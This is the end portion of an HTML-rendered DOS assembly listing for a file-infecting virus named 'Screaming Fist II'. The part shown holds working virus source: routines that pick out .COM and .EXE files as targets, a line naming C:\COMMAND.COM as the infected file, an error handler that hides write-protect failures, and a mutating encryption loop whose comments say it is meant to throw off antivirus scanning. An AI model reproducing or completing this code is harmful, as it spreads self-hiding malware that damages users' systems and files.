         </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">FUNCTION</span><span class="sc0">
         </span><span class="sc6">POP</span><span class="sc0">  </span><span class="sc8">ES</span><span class="sc0">                           </span><span class="sc1">;Restore all registers</span><span class="sc0">
         </span><span class="sc6">POP</span><span class="sc0">  </span><span class="sc8">DS</span><span class="sc0">
         </span><span class="sc6">POP</span><span class="sc0">  </span><span class="sc8">DI</span><span class="sc0">
         </span><span class="sc6">POP</span><span class="sc0">  </span><span class="sc8">SI</span><span class="sc0">
         </span><span class="sc6">POP</span><span class="sc0">  </span><span class="sc8">DX</span><span class="sc0">
         </span><span class="sc6">POP</span><span class="sc0">  </span><span class="sc8">CX</span><span class="sc0">
         </span><span class="sc6">POP</span><span class="sc0">  </span><span class="sc8">BX</span><span class="sc0">
         </span><span class="sc6">POP</span><span class="sc0">  </span><span class="sc8">AX</span><span class="sc0">
         </span><span class="sc6">RET</span><span class="sc0">                               </span><span class="sc1">;And quit</span><span class="sc0">

</span><span class="sc5">RESTORE_ATTRIBS</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様;</span><span class="sc0">
</span><span class="sc1">; This routine restores the files original attributes.                         ;</span><span class="sc0">
</span><span class="sc1">;様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様;</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4301H</span><span class="sc0">                   </span><span class="sc1">;Restore original attribs</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,[</span><span class="sc5">OLD_ATTRIBS</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;To what was read in earlier</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc5">OLD_DS</span><span class="sc0">
         </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">FUNCTION</span><span class="sc0">
         </span><span class="sc6">RET</span><span class="sc0">

</span><span class="sc5">NEW_24</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">                      </span><span class="sc1">;Any error will simply be ignored</span><span class="sc0">
         </span><span class="sc6">STC</span><span class="sc0">                            </span><span class="sc1">;Most useful for write protects</span><span class="sc0">
         </span><span class="sc6">IRET</span><span class="sc0">

</span><span class="sc1">;様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様;</span><span class="sc0">
</span><span class="sc1">;Please don't be a lamer and change the text to claim it was your own creation ;</span><span class="sc0">
</span><span class="sc1">;様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様;</span><span class="sc0">

</span><span class="sc5">TEXT</span><span class="sc0">    </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc12">'Screaming Fist II'</span><span class="sc0">    </span><span class="sc1">;For the AV people, can't have a dumb name!</span><span class="sc0">
</span><span class="sc5">COMMAND</span><span class="sc0"> </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc12">'C:\COMMAND.COM'</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc0">                </span><span class="sc1">;File infected</span><span class="sc0">

</span><span class="sc1">;様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様;</span><span class="sc0">
</span><span class="sc1">; This routine checks to see if the file at DS:DX has an extension of either   ;</span><span class="sc0">
</span><span class="sc1">; .COM or .EXE. AX is set to zero if either condition is met, and non-zero     ;</span><span class="sc0">
</span><span class="sc1">; If they aren't.                                                              ;</span><span class="sc0">
</span><span class="sc1">;様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様;</span><span class="sc0">

</span><span class="sc5">CHECK_NAME</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">

</span><span class="sc5">CHECK_FOR_PERIOD</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">LODSB</span><span class="sc0">
         </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">
         </span><span class="sc6">JZ</span><span class="sc0"> </span><span class="sc5">LEAVE_NAME_CHECK</span><span class="sc0">
         </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc12">'.'</span><span class="sc0">
         </span><span class="sc6">JNZ</span><span class="sc0"> </span><span class="sc5">CHECK_FOR_PERIOD</span><span class="sc0">
         </span><span class="sc6">LODSB</span><span class="sc0">
         </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">0DFH</span><span class="sc0">
         </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc12">'C'</span><span class="sc0">
         </span><span class="sc6">JZ</span><span class="sc0"> </span><span class="sc5">MAYBE_COM</span><span class="sc0">
         </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc12">'E'</span><span class="sc0">
         </span><span class="sc6">JZ</span><span class="sc0"> </span><span class="sc5">MAYBE_EXE</span><span class="sc0">
         </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">LEAVE_NAME_CHECK</span><span class="sc0">

</span><span class="sc5">MAYBE_COM</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">LODSW</span><span class="sc0">
         </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0DFDFH</span><span class="sc0">
         </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc12">'MO'</span><span class="sc0">
         </span><span class="sc6">JZ</span><span class="sc0"> </span><span class="sc5">FILE_GOOD</span><span class="sc0">
         </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">LEAVE_NAME_CHECK</span><span class="sc0">

</span><span class="sc5">MAYBE_EXE</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">LODSW</span><span class="sc0">
         </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0DFDFH</span><span class="sc0">
         </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc12">'EX'</span><span class="sc0">
         </span><span class="sc6">JNZ</span><span class="sc0"> </span><span class="sc5">LEAVE_NAME_CHECK</span><span class="sc0">

</span><span class="sc5">FILE_GOOD</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">

</span><span class="sc5">LEAVE_NAME_CHECK</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
         </span><span class="sc6">RET</span><span class="sc0">

</span><span class="sc1">;様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様</span><span class="sc0">
</span><span class="sc1">;This is the encryption routine. This is the only portion that remains         </span><span class="sc0">
</span><span class="sc1">;unencrypted. The bytes mark by an ENC_SWITCH are changed to throw off SCAN    </span><span class="sc0">
</span><span class="sc1">;様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様</span><span class="sc0">

</span><span class="sc5">ENC_START</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">

</span><span class="sc5">DECRYPT_US</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">BP</span><span class="sc0">
         </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">BP</span><span class="sc0">

</span><span class="sc5">ENC_SWITCH</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc8">BP</span><span class="sc0">                 </span><span class="sc1">;Alternates between this and PUSH BP, POP SI</span><span class="sc0">

         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc5">ENC_BYTE</span><span class="sc4">-</span><span class="sc5">NEXT_PLACE</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;Get ENC key #1</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc5">ENC_BYTE_2</span><span class="sc4">-</span><span class="sc5">NEXT_PLACE</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;Get ENC key #2</span><span class="sc0">

</span><span class="sc5">ENCRYPT_US</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc5">ENC_LENGTH</span><span class="sc0">         </span><span class="sc1">;Length to encrypt or decrypt</span><span class="sc0">

</span><span class="sc5">ENCRYPT_US_II</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">ENC_SWITCH_1</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">
         </span><span class="sc6">NOT</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">                    </span><span class="sc1">;Alternates bewtween NOT and NEG</span><span class="sc0">

</span><span class="sc5">ENC_SWITCH_2</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">
         </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">                 </span><span class="sc1">;Alternates between this and XOR AL,DL</span><span class="sc0">

</span><span class="sc5">ENC_SWITCH_4</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">
         </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc8">AL</span><span class="sc0">   </span><span class="sc1">;Alternates bewteen AL and DL</span><span class="sc0">
         </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">DL</span><span class="sc0">

</span><span class="sc5">ENC_SWITCH_3</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">
         </span><span class="sc6">NOT</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc0">                    </span><span class="sc1">;Alternates between NOT and NEG</span><span class="sc0">

</span><span class="sc5">ENC_SWITCH_5</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">
         </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc8">DL</span><span class="sc0">   </span><span class="sc1">;Alternates between DL and AL</span><span class="sc0">
         </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">                    </span><span class="sc1">;INC encryption pointer</span><span class="sc0">
</span><span class="sc5">ENC_SWITCH_6</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">
         </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc0">                    </span><span class="sc1">;Alternates between INC and DEC</span><span class="sc0">
         </span><span class="sc6">LOOP</span><span class="sc0"> </span><span class="sc5">ENCRYPT_US_II</span><span class="sc0">
         </span><span class="sc6">RET</span><span class="sc0">

</span><span class="sc5">ENC_BYTE</span><span class="sc0">   </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">00</span><span class="sc0">   </span><span class="sc1">;Storage space for encryption keys</span><span class="sc0">
</span><span class="sc5">ENC_BYTE_2</span><span class="sc0"> </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">00</span><span class="sc0">

</span><span class="sc5">FINI</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">

</span><span class="sc9">LENGTH</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">FINI</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">CURTAIN_OPEN</span><span class="sc0">

</span><span class="sc1">;様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様;</span><span class="sc0">
</span><span class="sc1">;This is the data table and is not included in the virus size                  ;</span><span class="sc0">
</span><span class="sc1">;様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様;</span><span class="sc0">
</span><span class="sc5">DATA_BEGIN</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">

</span><span class="sc5">OLD_ATTRIBS</span><span class="sc0"> </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc2">00</span><span class="sc0"> </span><span class="sc2">00</span><span class="sc0">      </span><span class="sc1">;File's old attributes</span><span class="sc0">

</span><span class="sc5">OLD_24_ES</span><span class="sc0"> </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc2">00</span><span class="sc0"> </span><span class="sc2">00</span><span class="sc0">        </span><span class="sc1">;Saves address of old INT 24</span><span class="sc0">
</span><span class="sc5">OLD_24_BX</span><span class="sc0"> </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc2">00</span><span class="sc0"> </span><span class="sc2">00</span><span class="sc0">

</span><span class="sc5">OLD_DS</span><span class="sc0"> </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc2">00</span><span class="sc0"> </span><span class="sc2">00</span><span class="sc0">           </span><span class="sc1">;Saves DS and ES here on entering</span><span class="sc0">
</span><span class="sc5">OLD_ES</span><span class="sc0"> </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc2">00</span><span class="sc0"> </span><span class="sc2">00</span><span class="sc0">

</span><span class="sc5">BUFFER_BEGIN</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">
</span><span class="sc5">BUFFER</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">1BH</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">         </span><span class="sc1">;Buffer for bytes read in from file</span><span class="sc0">
</span><span class="sc5">BUFFER_END</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">

</span><span class="sc5">DATA_END</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">

</span><span class="sc5">DATA_LENGTH</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">DATA_END</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">DATA_BEGIN</span><span class="sc0">        </span><span class="sc1">;Length of Data Table</span><span class="sc0">

</span><span class="sc5">BUF_LENGTH</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">BUFFER_END</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">BUFFER_BEGIN</span><span class="sc0">     </span><span class="sc1">;Length of file buffer</span><span class="sc0">

</span><span class="sc5">ENC_LENGTH</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">ENC_START</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">NEXT_PLACE</span><span class="sc0">
</span></div></body>
</html>
